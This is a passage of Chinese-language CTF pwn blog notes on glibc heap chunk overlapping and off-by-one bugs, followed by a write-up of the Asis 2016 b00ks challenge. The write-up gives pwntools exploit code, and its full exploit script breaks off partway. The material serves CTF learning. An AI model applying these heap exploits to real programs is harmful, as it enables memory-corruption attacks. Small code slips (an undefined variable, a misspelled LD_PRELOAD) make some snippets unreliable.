的进行操作可以实现 fastbin attack。</p><h3 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h3><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1, *ptr2, *ptr3, *ptr4;</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">128</span>);     <span class="comment">// smallbin1</span></span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    <span class="comment">// fastbin1</span></span><br><span class="line">    ptr3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    <span class="comment">// fastbin2</span></span><br><span class="line">    ptr4 = <span class="built_in">malloc</span>(<span class="number">128</span>);     <span class="comment">// smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);           <span class="comment">// 防止与 top 合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4 - <span class="number">0x8</span>) = <span class="number">0x90</span>;   <span class="comment">// 修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4 - <span class="number">0x10</span>) = <span class="number">0xd0</span>;  <span class="comment">// 修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);              <span class="comment">// unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);           <span class="comment">// 占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前向 extend 利用了 smallbin 的 unlink 机制, 通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>HITCON Trainging lab13、2015 hacklu bookstore、2016 Nuit du Hack CTF Quals : night deamonic heap</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wiki.x10sec.org/pwn/heap/chunk_extend_overlapping/#chunk-extendshrink">CTF Wiki Chunk Extend and Overlapping</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chunk Extend and Overlapping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>heap off-by-one</title>
      <link href="/note-pwn-off-by-one/"/>
      <url>/note-pwn-off-by-one/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>严格来说<code>off-by-one</code>漏洞是一种特殊的溢出漏洞, <code>off-by-one</code>指程序向缓冲区写入时, 写入的字节数超过了这个缓冲区本身申请的字节数并且只越界了一个字节</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>off-by-one</code> 是指单字节缓冲区溢出, 这种漏洞往往与</p><ol><li><p>边界验证不严和字符串操作有关</p><ol><li><p>使用循环语句向堆块中写入数据时, 循环次数设错, 导致多写入一个字节。该错误也被称为栅栏错误</p><blockquote><p>wikipedia: 栅栏错误（有时也称为电线杆错误或者灯柱错误）是差一错误的一种。如以下问题:</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">建造一条直栅栏（即不围圈）, 长 30 米、每条栅栏柱间相隔 3 米, 需要多少条栅栏柱？</span><br></pre></td></tr></table></figure><p>最容易想到的答案 10 是错的。这个栅栏有 10 个间隔, 11 条栅栏柱。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buff[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">    buff[i] = getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>或者是错误使用 read 函数的返回值, 导致多写入一个字节</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buff[<span class="number">10</span>];</span><br><span class="line">buff[read(<span class="number">0</span>, buff, <span class="number">10</span>)] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>read 函数返回值返回实际读到的字节数</strong></li></ul></li><li><p>字符串操作不规范</p></li></ol></li><li><p>不能排除写入的 size 正好就只多一个字节</p></li></ol><p>一般来说, 单字节溢出被认为是难以利用的, 但是因为 Linux 的堆管理机制 <code>ptmalloc</code> 验证的松散性, 基于 Linux 堆的 <code>off-by-one</code> 漏洞利用起来并不复杂, 并且威力强大。</p><p>off-by-one 是可以基于各种缓冲区的, 比如栈、<code>bss 段</code>等等, 但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。这里仅讨论堆上的 off-by-one 情况</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节为可控任意字节: 通过修改大小导致堆结构之间出现重叠, 从而泄露其他块数据, 或覆盖其他块数据。也可以使用 NULL 字节溢出方法</li><li>溢出字节为 NULL 字节:在 size 为 0x100 的时候, 溢出 NULL 字节可以使得 <code>prev_in_use</code>位被清零, 这样前块就会被认为是 free 块<ol><li>可以使用 unlink attack 方法处理</li><li>通过伪造 <code>prev_size</code>造成块间重叠, 此方法的关键在于 unlink 的时候没有检测按照 <code>prev_size</code>找到的块的大小与<code>prev_size</code>是否一致</li></ol></li></ol><p>在最新版本代码中, 已加入针对 2 中的后一种方法的 check, 但是在 2.28 前并没有该 check</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入, 则 2 的第二种方法无法使用, 但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= size; i++) &#123;</span><br><span class="line">        ptr[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1, *chunk2;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 gdb 对程序调试, 在进行输入前可以看到分配的两个用户区域为 16 字节的堆块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x5555555592a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000021 &lt;=== chunk2</span><br></pre></td></tr></table></figure><p>当我们执行<code>my_gets</code>进行输入<code>&quot;a&quot; * 17</code>之后, 可以看到数据发生了溢出覆盖到了下一个堆块的 <code>prev_size</code> 域</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x5555555592a0: 0x6161616161616161      0x6161616161616161 &lt;=== chunk1</span><br><span class="line">0x5555555592b0: 0x0000000000000061      0x0000000000000021</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000 &lt;=== chunk2</span><br></pre></td></tr></table></figure><p>查看<code>chunkinfo</code>, 很明显看到<code>chunk2-&gt; pre_size</code> 位被设置为了 0x61</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo 0x5555555592b0</span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x61</span><br><span class="line">size : 0x20</span><br><span class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br><span class="line">pwndbg&gt; chunkinfo 0x555555559290</span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x0</span><br><span class="line">size : 0x20</span><br><span class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br></pre></td></tr></table></figure><h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><p>第二种常见的导致 off-by-one 的场景就是字符串操作了, 常见的原因是字符串的结束符计算有误</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">40</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">void</span> *chunk1;</span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">  gets(buffer);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(buff) == <span class="number">24</span>) &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(chunk1, buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序乍看上去没有任何问题（不考虑栈溢出）, 可能很多人在实际的代码中也是这样写的。 但是 <code>strlen</code> 和 <code>strcpy</code> 的行为不一致却导致了 <code>off-by-one</code> 的发生。 <code>strlen</code> 是我们很熟悉的计算 ascii 字符串长度的函数, 这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的, 但是 <code>strcpy</code> 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节, 我们使用 <code>gdb</code>进行调试可以看到这一点。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x5555555592a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000411 &lt;=== next chunk</span><br></pre></td></tr></table></figure><p>在我们输入’A’*24 后执行<code>strcpy</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x5555555592a0: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x5555555592b0: 0x4141414141414141      0x0000000000000400 &lt;=== next chunk</span><br></pre></td></tr></table></figure><p>可以看到 <code>next chunk</code> 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖, 这种又属于<code>off-by-one</code> 的一个分支称为<code>NULL byte off-by-one</code>, 我们在后面会看到 <code>off-by-one</code> 与 <code>NULL byte off-by-one</code>在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢, 因为我们通常使用的 CPU 的字节序都是小端法的, 比如一个 DWORD 值在使用小端法的内存中是这样储存的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44, 0x43, 0x42, 0x41</span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://lantern.cool/wp-item-Asis-2016-b00ks/">Asis CTF 2016 b00ks</a></p><p><a href="https://lantern.cool/wp-item-plaidctf-2015-plaiddb/">plaidctf 2015 plaiddb</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/">CTF-wiki 堆中的 Off-By-One</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Asis-2016-b00ks</title>
      <link href="/wp-item-Asis-2016-b00ks/"/>
      <url>/wp-item-Asis-2016-b00ks/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Asis-2016-b00ks"><a href="#Asis-2016-b00ks" class="headerlink" title="Asis-2016-b00ks"></a>Asis-2016-b00ks</h2><p>题目: <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></p><ul><li><p>libc version: 2.23</p></li><li><p><code>checksec b00ks</code> 可以看到 64 位程序且保护全开</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Asis_2016_b00ks checksec b00ks</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/Users/Lantern/Desktop/note/pwn_note/heap/off-by-one/Asis_2016_b00ks/b00ks&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></li></ul><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>题目是一个常见的选单式程序, 功能是一个图书管理系统</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure><p>程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 book            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 id              dd ?</span><br><span class="line">00000004 padding1        dd ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 description     dq ?</span><br><span class="line">00000018 size            dd ?</span><br><span class="line">0000001C padding2        dd ?</span><br><span class="line">00000020 book            ends</span><br></pre></td></tr></table></figure><h3 id="Create"><a href="#Create" class="headerlink" title="Create"></a>Create</h3><p>book 结构中存在 name 和 description , name 和 description 在堆上分配。首先分配 name buffer , 使用 malloc , 大小自定但小于 32</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>, *(_QWORD *)&amp;size);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>, &amp;size);</span><br><span class="line">ptr = <span class="built_in">malloc</span>(size);</span><br></pre></td></tr></table></figure><p>之后分配 description , 同样大小自定但无限制</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nEnter book description size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">description = <span class="built_in">malloc</span>(size);</span><br></pre></td></tr></table></figure><p>之后分配 book 结构的内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">book = (book *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( book )</span><br><span class="line">&#123;</span><br><span class="line">     book-&gt;size = size;</span><br><span class="line">     book_list[v3] = (<span class="keyword">bool</span> *)book;</span><br><span class="line">     book-&gt;description = (__int64)description;</span><br><span class="line">     book-&gt;name = (__int64)name;</span><br><span class="line">     book-&gt;id = ++index;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>程序编写的 read_size 函数存在<code>off-by-one</code>漏洞, 字符串边界判断有误。例如调用<code>read_size(buf, 32)</code>时, <code>\x00</code>实际上写在了<code>buf[32]</code>的位置, 比预期多了一位。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">read_size</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄漏"><a href="#泄漏" class="headerlink" title="泄漏"></a>泄漏</h3><p>程序中的 read_size 函数存在 <code>off-by-one</code>。而程序中 <code>author name</code> 与 <code>book_list</code> 相邻。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000202040 ; char name[32]</span><br><span class="line">.bss:0000000000202040 _name           db 20h dup(?)           ; DATA XREF: .data:name↑o</span><br><span class="line">.bss:0000000000202060 ; book **book_list</span><br><span class="line">.bss:0000000000202060 _book_list      dq ?                    ; DATA XREF: .data:book_list↑o</span><br><span class="line">.bss:0000000000202068                 db    ? ;</span><br></pre></td></tr></table></figure><p>而事实上 read_size 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ , 所以这里是存在一个地址泄漏的漏洞。通过打印 <code>author name</code> 就可以获得 <code>pointer array</code> 中第一项的值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555554000 + 0x000000000202040</span><br><span class="line">0x555555756040: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555756050: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555756060: 0x00005555557590e0      0x0000000000000000</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>) <span class="comment"># input author name</span></span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>) <span class="comment"># create book1</span></span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>) <span class="comment"># print book1</span></span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>) <span class="comment"># &lt;== leak book1</span></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br></pre></td></tr></table></figure><h3 id="off-by-one-覆盖指针低字节"><a href="#off-by-one-覆盖指针低字节" class="headerlink" title="off-by-one 覆盖指针低字节"></a>off-by-one 覆盖指针低字节</h3><p>程序提供了 change 功能用于修改 author name, 所以通过 change 可以写入 author name, 利用 off-by-one 覆盖 book_list 第一个项的低字节</p><p>覆盖掉 book1 指针的低字节后, 这个指针会指向 book1-&gt;description, 由于程序提供了 edit 功能可以任意修改 description 中的内容, 那么我们就可提前在 description 中布置数据伪造一个 book 结构, 这个 book 结构的 description 和 name 指针可以由 book1-&gt;description 直接控制</p><blockquote><p>这里 book1-&gt;description 的地址要根据实际情况进行构造</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span>(<span class="params">addr</span>):</span></span><br><span class="line">    addr += <span class="number">58</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)<span class="comment"># create fake book in description</span></span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    fake_book_data = p64(<span class="number">0x1</span>) + p64(addr) + p64(addr) + pack(<span class="number">0xffff</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Enter new book description:&#x27;</span>)</span><br><span class="line">    io.sendline(fake_book_data) <span class="comment"># &lt;== fake book</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>) <span class="comment"># change author name</span></span><br><span class="line">    io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>) <span class="comment"># &lt;== off-by-one</span></span><br></pre></td></tr></table></figure><p>这里在 description 中伪造了 book , 使用的数据是 p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) 。 其中 addr+58 是为了使指针指向 book2 的指针地址, 使得我们可以任意修改这些指针值。</p><h3 id="通过栈实现利用"><a href="#通过栈实现利用" class="headerlink" title="通过栈实现利用"></a>通过栈实现利用</h3><p>通过前面两部分我们已经获得了任意地址写的能力, 那么我们很容易想到写 got 表劫持流程或者写 __malloc_hook 劫持流程等。但这个题目特殊在于开启 PIE 且没有泄漏 libc 基地址的方法。</p><p>这道题的巧妙之处在于在分配第二个 book 时, 使用一个很大的尺寸, 使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆, 另一种是 mmap 会单独映射一块内存。</p><p>在这里我们申请一个超大的块, 来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200804111747.png" alt="20200804111747"></p><p>添加超大堆块后</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x21000</span>, <span class="string">&quot;c&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;d&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200804111715.png" alt="20200804111715"></p><h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><blockquote><p>由于 <code>pwndocker</code> 的 <code>libc</code> 好像有点点问题, 跟正常比赛题目的 <code>libc</code> 不太一样, 所以 one_gadget 的地址需要自行查询。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">p = process([<span class="string">&quot;./b00ks&quot;</span>], env = &#123;<span class="string">&#x27;LOAD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.readline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">break_point</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b &quot;</span> + break_point)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span>(<span class="params">name_size, name, description_size, description</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter book name size:&quot;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    sla(<span class="string">&quot;Enter book name (Max 32 chars):&quot;</span>, name)</span><br><span class="line">    sla(<span class="string">&quot;Enter book description size: &quot;</span>, <span class="built_in">str</span>(description_size))</span><br><span class="line">    sla(<span class="string">&quot;Enter book description: &quot;</span>, <span class="built_in">str</span>(description))</span><br><span class="line">    log.info(<span class="string">&quot;Create&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_book</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    